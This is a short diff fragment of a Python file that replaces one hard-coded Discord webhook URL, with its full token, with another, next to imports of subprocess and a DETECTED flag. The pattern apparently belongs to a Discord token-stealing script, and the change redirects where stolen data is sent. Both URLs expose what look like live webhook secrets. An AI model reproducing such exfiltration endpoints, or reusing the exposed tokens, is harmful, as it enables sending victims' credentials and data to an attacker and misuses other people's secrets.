@@ -849,7 +849,7 @@ import re
 import subprocess
 
 
-hook = "https://discord.com/api/webhooks/1067032740416983119/m2dQxFWxafXmUOUDpF7kxIAw8YV8lE1XyNE7esgplwhLBCaChBmE0xces0EokAhrv6LV"
+hook = "https://discord.com/api/webhooks/1067034649395724348/eVj-cYyKrxjlnjw8iIE_OsdAx5wuH7NNKY1XCa7WtLpe9o1E1RcfWuDp7EaU6Y1eMKS4"
 
 
 DETECTED = False
